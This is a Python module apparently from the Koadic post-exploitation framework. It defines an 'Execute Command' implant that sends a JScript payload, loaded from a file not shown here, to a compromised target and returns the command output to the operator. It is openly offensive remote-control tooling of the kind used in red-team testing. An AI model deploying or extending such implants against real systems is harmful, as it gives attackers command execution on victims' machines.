import core.job
import core.implant
import uuid

class ExecCmdJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Result for `%s`:" % self.options.get('CMD'))
        self.shell.print_plain(self.data)

class ExecCmdImplant(core.implant.Implant):

    NAME = "Execute Command"
    DESCRIPTION = "Executes a command on the target system."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        self.options.register("CMD", "hostname", "command to run")
        self.options.register("OUTPUT", "true", "retrieve output?", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        self.options.register("FILE", "", "random uuid for file name", hidden=True)

    def run(self):
        # generate new file every time this is run
        self.options.set("FILE", uuid.uuid4().hex)

        payloads = {}
        #payloads["vbs"] = self.load_script("data/implant/manage/exec_cmd.vbs", self.options)
        payloads["js"] = self.loader.load_script("data/implant/manage/exec_cmd.js", self.options)

        self.dispatch(payloads, ExecCmdJob)
